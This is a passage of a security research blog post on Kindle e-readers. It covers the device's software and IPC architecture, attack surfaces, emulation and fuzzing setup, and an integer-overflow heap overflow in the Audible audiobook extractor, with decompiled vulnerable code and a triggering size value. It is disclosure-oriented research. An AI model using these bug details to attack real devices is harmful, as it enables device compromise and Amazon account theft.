<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.152.2"><link rel=canonical href=/posts/dont-judge-an-audiobook-by-its-cover-taking-over-your-amazon-account-with-a-kindle/><meta property="og:url" content="/posts/dont-judge-an-audiobook-by-its-cover-taking-over-your-amazon-account-with-a-kindle/"><meta property="og:site_name" content="THALIUM"><meta property="og:title" content="Don't judge an audiobook by its cover: taking over your Amazon account with a Kindle"><meta property="og:description" content="Although Kindle e-readers are a prime target in modding and jailbreaking communities, there is little public work about vulnerability research in remote code execution scenarios.
In this post, we give technical details about a chain of vulnerabilities we identified that can be triggered by downloading a malicious Audible audiobook, allowing to take full control of the device and its registered Amazon account."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-16T08:00:00+00:00"><meta property="article:modified_time" content="2025-12-16T08:00:00+00:00"><meta property="article:tag" content="Vulnerability Research"><meta property="article:tag" content="Exploit"><meta property="article:tag" content="RCE"><meta property="og:image" content="https://blog.thalium.re/posts/img/kindle/kindle.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.thalium.re/posts/img/kindle/kindle.jpg"><meta name=twitter:title content="Don't judge an audiobook by its cover: taking over your Amazon account with a Kindle"><meta name=twitter:description content="Although Kindle e-readers are a prime target in modding and jailbreaking communities, there is little public work about vulnerability research in remote code execution scenarios.
In this post, we give technical details about a chain of vulnerabilities we identified that can be triggered by downloading a malicious Audible audiobook, allowing to take full control of the device and its registered Amazon account."><meta itemprop=name content="Don't judge an audiobook by its cover: taking over your Amazon account with a Kindle"><meta itemprop=description content="Although Kindle e-readers are a prime target in modding and jailbreaking communities, there is little public work about vulnerability research in remote code execution scenarios.
In this post, we give technical details about a chain of vulnerabilities we identified that can be triggered by downloading a malicious Audible audiobook, allowing to take full control of the device and its registered Amazon account."><meta itemprop=datePublished content="2025-12-16T08:00:00+00:00"><meta itemprop=dateModified content="2025-12-16T08:00:00+00:00"><meta itemprop=wordCount content="6843"><meta itemprop=image content="https://blog.thalium.re/posts/img/kindle/kindle.jpg"><meta itemprop=keywords content="Vulnerability Research,Exploit,RCE"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><title>Don't judge an audiobook by its cover: taking over your Amazon account with a Kindle</title><script>MathJax={tex:{inlineMath:[["âˆ³","âˆ³"]],displayMath:[["âˆ³âˆ³","âˆ³âˆ³"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png></img>
<span>THALIUM</span></a></div><div class=nav-item-title><a class=nav-item href=/posts/>Posts</a></div><div class=nav-item-title><a class=nav-item href=/joinus/>Join Us</a></div><div class=nav-item-title><a class=nav-item href=/about/>About</a></div></nav></div></header><article class=post><h1 class=title>Don't judge an audiobook by its cover: taking over your Amazon account with a Kindle</h1><div class=content><p>Amazon&rsquo;s Kindle devices are a cornerstone of the modern reading experience, with millions of units sold and an equally vast number of e-books available in the Kindle Store.</p><p>There is a prominent modding community around Kindle devices, as many users are interested in customization and jailbreaking. However, there has been comparatively less focus on in-depth vulnerability research, especially in full chain scenarios involving remote code execution.</p><img src=/posts/img/kindle/kindle.jpg alt=Kindle style=margin-top:1.6em;margin-bottom:1.6em><p>Two main elements make Kindle devices particularly attractive from a security standpoint.</p><p>First, <strong>the complexity and variety of the software stack</strong>. The Kindle e-reader supports a lot of file formats: e-books (AZW, MOBI, PDF&mldr;) but also many underlying media formats (images, fonts, audio&mldr;). Dozens of parsers are at play, and they were not all written equal (except for the fact that they&rsquo;re all C/C++ ðŸ˜‰).</p><p>Second, <strong>the impact of an exploit</strong>. It may not be obvious at first glance, but most Kindle devices are registered to an Amazon account. By hacking a Kindle, you can steal the Amazon session cookies, take over the account, access personal data, pivot to other devices and maybe even empty the victim&rsquo;s bank account.</p><p>In this blog post, we dive into the internals of Kindle devices and discuss an interesting vulnerability in <strong>the parsing of Audible audiobooks</strong>, which once combined with a privilege escalation in an LIPC component, granted us full control of the e-reader.</p><h3 id=table-of-contents>Table of Contents</h3><ul><li><a href=#software-architecture>Software architecture</a><ul><li><a href=#user-interface>User interface</a></li><li><a href=#lipc>LIPC</a></li><li><a href=#scanner-extractors-and-readers>Scanner, extractors and readers</a></li><li><a href=#attack-surfaces>Attack surfaces</a></li></ul></li><li><a href=#setting-up-a-vulnerability-research-environment>Setting up a vulnerability research environment</a><ul><li><a href=#emulating-the-kindle-firmware>Emulating the Kindle firmware</a></li><li><a href=#fuzzing-emulated-libraries>Fuzzing emulated libraries</a></li><li><a href=#jailbreaking-a-physical-device>Jailbreaking a physical device</a></li></ul></li><li><a href=#vuln-1-heap-overflow-in-the-audible-extractor>Vuln #1: heap overflow in the Audible extractor</a><ul><li><a href=#discovery>Discovery</a></li><li><a href=#triggering-the-bug>Triggering the bug</a></li><li><a href=#exploitation>Exploitation</a></li></ul></li><li><a href=#vuln-2-path-traversal-in-the-keyboard-service>Vuln #2: path traversal in the keyboard service</a></li><li><a href=#conclusion>Conclusion</a><ul><li><a href=#timeline>Timeline</a></li></ul></li></ul><h1 id=software-architecture>Software architecture</h1><p>The Kindle OS is based on Linux (arm32). Its firmware can be downloaded from Amazon <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=GKMQC26VQQMM8XSW">here</a>, and can be extracted using <a href=https://github.com/NiLuJe/KindleTool>KindleTool</a>.</p><p>The system is rather unhardened: a lot of binaries lack basic mitigations (PIE, RELRO, stack canaries, etc.) and rely on an ancient libc (2.20). ASLR is however enabled. Processes usually run either as root, or as a slightly less privileged user called <code>framework</code>.</p><p>Besides the usual <code>/lib</code> and <code>/usr/lib</code> paths, many Amazon-specific native libraries can be found in the following folders:</p><ul><li><code>/usr/java/lib</code></li><li><code>/app/lib</code></li><li><code>/usr/lib/lua</code></li></ul><h2 id=user-interface>User interface</h2><p>Most of the UI is either written in Java / React Native or in HTML through the abstraction of <em>booklets</em>, but there is a lot of native code for underlying operations, such as parsing files.</p><p>These applications can talk to each other and system services using <strong>LIPC</strong>, Amazon&rsquo;s own IPC library based on <a href=https://en.wikipedia.org/wiki/D-Bus>D-Bus</a>.</p><p>On the one hand, booklets relying on native code can directly use liblipc to perform inter-process communication. HTML user interfaces, on the other hand, rely on <em>Pillow</em>, an abstraction that allows JavaScript to access LIPC through a native bridge.</p><p>Some applications, such as the Kindle Store, are launched through <em>mesquite</em>, a WAF (Web Application Framework) based on WebKit that exposes a <code>window.kindle</code> object to access the native bridge (albeit with some access control / sandboxing).</p><p>A generic Chromium-based web browser can also be launched through the <code>browser</code> mesquite application (yes, it&rsquo;s basically Chromium running inside a browser interface written in JS and itself based on WebKit). It has, however, more limited capacity (no native bridge).</p><p><a href=/posts/img/kindle/architecture-dark.png target=_blank><img src=/posts/img/kindle/architecture-dark.png alt=Architecture></a></p><h2 id=lipc>LIPC</h2><p>LIPC services expose <em>properties</em> that can be read or written. There are three types of properties:</p><ul><li>integers (<code>Int</code>) ;</li><li>strings (<code>Str</code>) ;</li><li>hash arrays (<code>Has</code>), essentially a list of key-value maps.</li></ul><p>When a property is queried (read or write), a callback in the associated LIPC service is triggered to handle the query.</p><p>Actually, &ldquo;properties&rdquo; is sometimes a confusing name, as many properties are used to perform actions. Such properties are often write-only, as seen for instance with the Wi-Fi service:</p><pre tabindex=0><code>com.lab126.wifid
        w       Str     deleteCertificate
        w       Int     hotSpotDBDownloadStatus
        w       Str     cmConnect
        w       Str     cmCheckConnection
        w       Str     cmDisconnect
</code></pre><p>Similarly, hash array properties are usually leveraged for remote procedure calls, since they take key-value parameters as input, and can output a key-value response as well.</p><p>There are several useful built-in commands on a Kindle to interact with the LIPC system:</p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>lipc-get-prop</code></td><td style=text-align:left>Read a property (Int / Str)</td></tr><tr><td style=text-align:left><code>lipc-set-prop</code></td><td style=text-align:left>Set a property (Int / Str)</td></tr><tr><td style=text-align:left><code>lipc-hash-prop</code></td><td style=text-align:left>Query a hash array property (Has)</td></tr><tr><td style=text-align:left><code>lipc-daemon</code></td><td style=text-align:left>Register events and link them to scripts</td></tr><tr><td style=text-align:left><code>lipc-send-event</code></td><td style=text-align:left>Send an event</td></tr><tr><td style=text-align:left><code>lipc-wait-event</code></td><td style=text-align:left>Wait for an event</td></tr><tr><td style=text-align:left><code>lipc-probe</code></td><td style=text-align:left>List all LIPC services and their properties</td></tr></tbody></table><p>The <code>lipc-probe</code> especially stands out, as it allows to dump the whole LIPC surface at once (<code>lipc-probe -a -v</code>).</p><p>LIPC does not seem to feature any built-in access control mechanism either, therefore the output of <code>lipc-probe</code> is the same for the <code>root</code> and <code>framework</code> users.</p><p>A service registers with the LIPC system using a name (e.g. <code>com.lab126.booklet.home</code>), and exposes properties through it. For instance:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>hdl <span style=color:#f92672>=</span> <span style=color:#a6e22e>LipcOpenEx</span>(<span style=color:#e6db74>&#34;com.test.service&#34;</span>, <span style=color:#f92672>&amp;</span>status);  <span style=color:#75715e>// or LipcOpen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (hdl) {
</span></span><span style=display:flex><span>  ret <span style=color:#f92672>=</span> <span style=color:#a6e22e>LipcRegisterStringProperties</span>(hdl, properties, <span style=color:#f92672>&amp;</span>data);
</span></span><span style=display:flex><span>  <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>A client can then interact with a service using its name, through a &ldquo;generic&rdquo;, anonymous handle retrieved with <code>LipcOpenNoName()</code> (property getting and setting are single transactions).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> ((hdl <span style=color:#f92672>=</span> <span style=color:#a6e22e>LipcOpenNoName</span>()) <span style=color:#f92672>==</span> NULL)
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>LipcGetStringProperty</span>(hdl, <span style=color:#e6db74>&#34;com.test.service&#34;</span>, <span style=color:#e6db74>&#34;some_property&#34;</span>, <span style=color:#f92672>&amp;</span>status) <span style=color:#f92672>==</span> LIPC_OK)
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>puts</span>(status);
</span></span></code></pre></div><p>Internally, liblipc is mostly a wrapper around D-Bus that adds an abstraction layer for the three discussed property types. Hash arrays are the most complex type and are implemented using Linux shared memory (<code>shm</code>).</p><h2 id=scanner-extractors-and-readers>Scanner, extractors and readers</h2><p>To answer the question &ldquo;what happens to downloaded e-books&rdquo;, we have to look at three main components: the <em>scanner</em>, the <em>extractors</em>, and the <em>readers</em>.</p><p><a href=/posts/img/kindle/book-flow.png target=_blank><img src=/posts/img/kindle/book-flow.png alt="Flow of e-book processing"></a></p><p>E-books are downloaded to the <code>/mnt/us/documents</code> folder. <code>/mnt/us</code> is a userspace filesystem that is exposed through USB when you connect a Kindle to a PC, and users may sideload books via this connection.</p><p>When a new file is found in one of these folders, the <strong>scanner process</strong> (<code>/usr/bin/scanner</code>) will handle it.</p><p>Depending on the file extension, a different <strong>extractor</strong> will be loaded and called. The role of an extractor is to fetch metadata from the book so that it can be added to the library.</p><p>The <code>/usr/lib/ccat</code> folder contains the native libraries for the extractors:</p><ul><li><code>libfileE.so</code></li><li><code>libAudibleExtractorE.so</code></li><li><code>libEBridge.so</code></li><li><code>libmobi8extractorE.so</code></li><li><code>libpdfE.so</code></li><li><code>libtopazE.so</code></li><li><code>libyjextractorE.so</code></li></ul><p>Extractors often don&rsquo;t do as much parsing as when the book is really opened later on, but they still have to process enough of the file to retrieve, for instance, the book&rsquo;s name, authors, length, language, cover image / thumbnail, etc.</p><p>Once an e-book is added to the library, it can be opened and read. This action will be handled by <strong>readers</strong>, which are implemented in Java:</p><ul><li><code>/opt/amazon/ebook/lib/HTMLReader-impl.jar</code></li><li><code>/opt/amazon/ebook/lib/MobiReader-impl.jar</code></li><li><code>/opt/amazon/ebook/lib/PDFReader-impl.jar</code></li><li><code>/opt/amazon/ebook/lib/TopazReader-impl.jar</code></li><li><code>/opt/amazon/ebook/lib/YJReader-impl.jar</code></li></ul><p>These readers will often rely on native libraries for parsing the book. For instance, Topaz files (an ancient proprietary e-book format from Amazon) are processed by <code>TopazReader</code>, which calls JNI methods exported by <code>/usr/java/lib/libTopaz.so</code>.</p><p>Some more complex readers may also interact with local HTTP servers (such as <code>pdfreader</code> or <code>kfxreader</code>) in order to process and render the book.</p><h2 id=attack-surfaces>Attack surfaces</h2><p>Examples of <strong>remote attack scenarios</strong> targeting Kindle devices include:</p><ul><li>downloading a malicious e-book from the Kindle Store;</li><li>sideloading a malicious e-book from a third-party website through USB;</li><li>visiting a malicious web page with the integrated browser;</li><li>short-range wireless attacks (e.g. Wi-Fi, Bluetooth, 4G).</li></ul><p>Additionally, physical access (e.g. USB) may be leveraged for jailbreaking purposes.</p><p>The Kindle Store is an interesting vector, as users may self-publish their own books through <em>Kindle Direct Publishing</em>. Amazon lists the supported file formats for e-book manuscripts <a href=https://kdp.amazon.com/help/topic/G200634390>here</a>, and there are also guidelines for book formatting.</p><p>As for uploaded files, however, it is hard to tell whether they undergo some kind of security scan, or if Amazon enforces certain requirements â€” this whole process is opaque. They may even get dynamically converted or repackaged for DRM reasons.</p><p>Numerous surfaces are reachable through a malicious e-book. The parsing logic may be attacked during either the extraction phase or the reading phase. This includes:</p><ul><li>parsing of e-book file formats themselves (AZW, MOBI, PDF&mldr;): some are rather common, some are proprietary and not very well-known;</li><li>parsing of XML, HTML, CSS;</li><li>parsing of various media (images, fonts, audio streams&mldr;).</li></ul><p>The surface that opens upon visiting a malicious web page is quite interesting as well. Not many people will use the integrated browser feature on its own, but the browser can be opened upon clicking a malicious link inside an e-book.</p><p>Regarding the browser itself, one may try attacking Amazon&rsquo;s own Chromium fork called <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=202103420">Silk</a>. Of course, generic browser exploitation is also workable (as seen with <a href=https://kindlemodding.org/jailbreaking/AdBreak/>AdBreak</a>), but probably less fun than finding bugs in Amazon code.</p><p>The browser could also be leveraged to reach local services running on the Kindle device, such as local HTTP servers (<code>webreader</code>, <code>kfxreader</code>, <code>kfxview</code>, <code>cvm</code>, <code>fastmetrics</code>). Most of these, however, are guarded by a token (<code>/tmp/session_token</code>) that must be passed in an HTTP header (and even if the token is known, any request containing a header that is not <a href=https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header>CORS-safelisted</a> will be blocked).</p><p>As for short-range attacks, we noticed that there is some custom additional kernel code linked to Wi-Fi and Bluetooth, but did not really look any further.</p><p>Finally, we are also interested in <strong>local attack surfaces</strong>. These can be leveraged for jailbreaking or local privilege escalation as part of a full chain exploit.</p><p>Local attack surfaces are manifold: some obvious ones include local network services running as root (e.g. <code>stackdumpd</code>, <code>fastmetrics</code>), or LIPC services running as root (given by <code>lipc-probe</code>).</p><p>One could also target custom kernel code (e.g. drivers) or generic Linux surface (the kernel is a bit old â€” the 5.17.1.0.4 firmware seems to run Linux 4.9.77).</p><h1 id=setting-up-a-vulnerability-research-environment>Setting up a vulnerability research environment</h1><h2 id=emulating-the-kindle-firmware>Emulating the Kindle firmware</h2><p>The best way to perform dynamic analysis of the Kindle firmware is undoubtedly to jailbreak a Kindle. But before investing in an actual device, or in the (common) event that there is no public jailbreak for the latest firmware version, emulation is a good option.</p><p>We tried our hands at emulating the whole system, but for reasons that go beyond the scope of this post, it did not work out very well â€” therefore, we rather shifted our focus to <strong>user mode emulation</strong> with QEMU.</p><p>Our goal is to eventually be able to fuzz shared libraries, so we want to cross-compile binaries. The main annoyance is that our target depends on an old libc (2.20), and we also want to use dynamic linking (otherwise <code>dlopen</code> / <code>dlsym</code> will not work).</p><p>Naively using an up-to-date <code>arm-linux-gnueabihf-gcc</code> and running <code>qemu-arm</code> won&rsquo;t work because of conflicting libc symbols. A &ldquo;dirty hack&rdquo; would be to force the target to use a more recent libc, for instance like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cd rootfs
</span></span><span style=display:flex><span>qemu-arm <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -L . ./recent-toolchain/lib/ld-linux-armhf.so.3 <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --library-path /recent-toolchain/lib /path/to/binary
</span></span></code></pre></div><p>This works because of forward compatibility, but the environment won&rsquo;t be the exact same (for example, if we find a heap vulnerability, this will greatly impact exploitation).</p><p>We eventually opted for <a href=https://github.com/crosstool-ng/crosstool-ng>crosstool-ng</a>, a toolchain generator. We can configure a toolchain for arm32 with hard float, libc 2.19 (2.20 is not available for some reason) and a close target kernel.</p><p>Once we have a decent toolchain to cross-compile our binary, we can drop a <code>qemu-arm-static</code> inside the rootfs, chroot to it, and it will work:</p><pre tabindex=0><code>$ sudo cp /usr/bin/qemu-arm-static rootfs/usr/bin
$ sudo chroot rootfs qemu-arm-static /bin/bash
/ # qemu-arm-static /tmp/hello
Hello world
</code></pre><h2 id=fuzzing-emulated-libraries>Fuzzing emulated libraries</h2><p>Now that we have a QEMU setup for user mode emulation and we know how to cross-compile a harness to run code from libraries, the next logical step would be to fuzz these libraries.</p><p>We quickly turned to <a href=https://aflplus.plus/>AFL++</a>, since it is not only one of the best and most well-known fuzzers that can be used against binary-only targets, but also features a QEMU mode.</p><p>In order to run AFL++ from inside our chrooted environment, we need to build it statically and build the QEMU support specifically for ARM:</p><pre tabindex=0><code>git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make all STATIC=1
cd qemu_mode
STATIC=1 CPU_TARGET=arm ./build_qemu_support.sh
sudo cp .../afl-fuzz ../afl-qemu-trace /path/to/rootfs/fuzz/
</code></pre><p>AFL++ also needs <code>/dev/urandom</code>, so we can bind mount it:</p><pre tabindex=0><code>sudo touch rootfs/dev/urandom
sudo mount --bind /dev/urandom rootfs/dev/urandom
</code></pre><p>Finally, we can chroot to the rootfs and run the fuzzer like this:</p><pre tabindex=0><code>AFL_INST_LIBS=1 AFL_ENTRYPOINT=0x... \
  ./afl-fuzz -Q -i in -o out -c 0 -- ./harness @@
</code></pre><p>Note: the <code>AFL_ENTRYPOINT</code> environment variable dictates when to start the forkserver, which helps to increase the speed (an example use is given <a href=https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.deferred_initialization_example.md>here</a>).</p><p>For certain targets, it may be useful to hook functions. For instance, it was observed that certain libraries frequently raise <code>SIGABRT</code> because of C++ exceptions when parsing a file format. In this case, hooking <code>__cxa_throw</code> can help removing many spurious crashes â€” this can be achieved by cross-compiling a shared library and leveraging <code>LD_PRELOAD</code>:</p><pre tabindex=0><code>AFL_PRELOAD=/fuzz/hook-throw.so AFL_INST_LIBS=1 AFL_ENTRYPOINT=0x... \
  ./afl-fuzz -Q -i in -o out -c 0 -- ./harness @@
</code></pre><h2 id=jailbreaking-a-physical-device>Jailbreaking a physical device</h2><p>In previous works, people have successfully managed to gain a root shell by disassembling the device and connecting to the serial port. However, on more recent Kindle devices, this serial port either does not exist anymore, or it does, but the root login is explicitly disabled.</p><p>We began our experiments by using a software jailbreak on a 2019 Kindle, and then got a bit lucky: right at the moment we identified our first vulnerability and started working on an exploit, a software jailbreak for the latest version (<a href=https://kindlemodding.org/jailbreaking/WinterBreak/>WinterBreak</a>) was released.</p><p>We thus jailbroke an 11th generation Kindle (2024 release) running the latest version of the firmware (5.17.1.0.4 at the time of our work), and we would like to acknowledge the modding community for their work which was a great help in testing and debugging our exploit.</p><h1 id=vuln-1-heap-overflow-in-the-audible-extractor>Vuln #1: heap overflow in the Audible extractor</h1><h2 id=discovery>Discovery</h2><p>While analyzing the scanning phase, it came to our attention that in addition to regular e-book files, <strong>Audible files (<code>.aax</code>) could also be loaded by a Kindle</strong>. Users can indeed pair Bluetooth headphones to their device and listen to audiobooks, although this feature is not advertised much and most people will rather use their smartphone for that.</p><p>Sideloading AAX files does not technically make a lot of sense, because Audible audiobooks are DRM-protected (they have to be bought from Amazon and are linked to your account).</p><p>But the interesting part is that even if an AAX file is not yours and even if there are no paired headphones, the scanner will still process the file and the extractor will go quite deep in the parsing to fetch metadata.</p><p>The vulnerability we found can be triggered during this <strong>scanning phase</strong>.</p><p>The extractor, <code>libAudibleExtractorE.so</code>, depends on <code>libaudibleaaxsdk.so</code>, the library that contains all the parsing logic for AAX files.</p><p>At first, we tried to throw a fuzzer at <code>fetchContentInformation</code>, a function exposed by the extractor library. It simply takes a path to the AAX file as argument, and is therefore a good fuzzing target.</p><p>However, after many hours of parallel fuzzing effort and excepted a spurious <code>SIGFPE</code> crash, nothing of interest was found. The fuzzer really seemed to struggle finding new paths and exploring the parser in its entirety.</p><p>Moreover, we found very few public AAX sample files to use as input corpus, and they were very large files (~20 MB), which greatly slows down fuzzing.</p><p>This is when we realized that AAX files are essentially augmented MP4 files, which stems off the MPEG-4 standard. It is itself based on the <strong>ISO base media file format</strong>, or ISOBMFF.</p><p>Many multimedia file formats are actually based on the ISOBMFF standard. It consists of a tree structure with <em>boxes</em>, also called <em>atoms</em>, which are essentially chunks of data inside the file.</p><img src=/posts/img/kindle/mp4-dark.png alt="Layout of an MP4 file" width=65%><p>Each atom has a name called a <em>FourCC</em> (four-character code), a size, and data. The format is not outstandingly complex in itself, but there is a vast amount of atom types (more than a hundred only in ISOBMFF).</p><p>It is also common to stumble upon non-standard atoms or other variations from the MPEG-4 standard, as seen for instance with Apple&rsquo;s QuickTime (MP4 was originally based on the QuickTime file format, but both have slightly diverged since then).</p><p>Unlike, for example, the Kindle&rsquo;s PDF reader which is based on Foxit, <code>libaudibleaaxsdk.so</code> does not rely on any third-party code â€” it seems that the developers reimplemented a whole MPEG-4 parser from scratch. This suddenly makes the Audible surface even more interesting than it was!</p><p>Although we could attempt implementing and fuzzing an <em>ad hoc</em> grammar, we ended up looking for bugs by manually reversing and reviewing the decompiled code of <code>libaudibleaaxsdk.so</code>. We especially looked for poor coding patterns such as integer overflows.</p><p>This bottom-up approach proved very fruitful, as we quickly hit upon this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>SeekAtom</span>(input_stream, v38, v41 <span style=color:#f92672>+</span> v45, <span style=color:#e6db74>&#34;stsc&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>read_byte_and_24bit</span>(input_stream, <span style=color:#f92672>&amp;</span>v50, <span style=color:#f92672>&amp;</span>v52);
</span></span><span style=display:flex><span><span style=color:#a6e22e>read_dword_big_endian</span>(input_stream, <span style=color:#f92672>&amp;</span>n_entries);
</span></span><span style=display:flex><span>buf <span style=color:#f92672>=</span> <span style=color:#a6e22e>OAAmalloc</span>(<span style=color:#ae81ff>12</span> <span style=color:#f92672>*</span> n_entries);
</span></span><span style=display:flex><span>k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> ( k <span style=color:#f92672>&lt;</span> n_entries ) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>read_dword_big_endian</span>(input_stream, <span style=color:#f92672>&amp;</span>v53)) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>read_dword_big_endian</span>(input_stream, <span style=color:#f92672>&amp;</span>v54)) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>read_dword_big_endian</span>(input_stream, <span style=color:#f92672>&amp;</span>v55)) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  buf <span style=color:#f92672>+=</span> <span style=color:#ae81ff>12</span>;
</span></span><span style=display:flex><span>  k<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(buf <span style=color:#f92672>-</span> <span style=color:#ae81ff>12</span>) <span style=color:#f92672>=</span> v53;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(buf <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>=</span> v54;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(_DWORD <span style=color:#f92672>*</span>)(buf <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>=</span> v55;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>During the processing of an <code>stsc</code> atom, an arbitrary big-endian DWORD is read from the AAX file (<code>n_entries</code>) and used to perform a memory allocation.</p><p>Since the multiplication is 32-bit, we could easily perform an <strong>integer overflow</strong>: for instance, with a size of <code>0x15555556</code>, it will actually call <code>malloc(8)</code> because âˆ³12 \times \text{0x15555556} = 8 \mod 2^{32}âˆ³.</p><p>Right after the allocation, the parser enters a loop that will, for each entry, read three controlled DWORDs from the file and copy them to the allocated buffer. This is a textbook example of a <strong>heap overflow induced by an integer overflow in an allocation</strong>.</p><h2 id=triggering-the-bug>Triggering the bug</h2><p>Now that we have discovered a potential bug, we need to find a path that allows to trigger it, and confirm that we can indeed insert a bogus size inside an <code>stsc</code> atom that survives all the way up to the allocation (there could be additional checks elsewhere we haven&rsquo;t seen yet).</p><p>During the extraction, one of the last pieces of metadata that <code>libAudibleExtractorE.so</code> will try to fetch from the AAX file is a list of images that are embedded in the audiobook:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>AAXGetImageCount</span>(ctx, <span style=color:#f92672>&amp;</span>content_info<span style=color:#f92672>-&gt;</span>image_count);
</span></span><span style=display:flex><span>image_count <span style=color:#f92672>=</span> content_info<span style=color:#f92672>-&gt;</span>image_count;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( image_count <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> ) {
</span></span><span style=display:flex><span>  content_info<span style=color:#f92672>-&gt;</span>images_info1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(image_count, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>  content_info<span style=color:#f92672>-&gt;</span>images_info2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(image_count, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>  content_info<span style=color:#f92672>-&gt;</span>images_info3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(image_count, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(content_info<span style=color:#f92672>-&gt;</span>images_info1, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> image_count);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(content_info<span style=color:#f92672>-&gt;</span>images_info2, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> image_count);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(content_info<span style=color:#f92672>-&gt;</span>images_info3, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4</span> <span style=color:#f92672>*</span> image_count);
</span></span><span style=display:flex><span>  k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( k <span style=color:#f92672>&lt;</span> content_info<span style=color:#f92672>-&gt;</span>image_count ) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memset</span>(<span style=color:#f92672>&amp;</span>image_info, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x18</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>AAXGetImageInfo</span>(ctx, k, <span style=color:#f92672>&amp;</span>image_info) ) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( (g_lab126_log_mask <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x2000000</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> )
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_syslog_chk</span>(<span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;E audibleMetaReader:AAXGetImageCount:err=%d,image=%d,file=%s:Audible AAXGetImageInfo error&#34;</span>, <span style=color:#ae81ff>0</span>, k, file);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
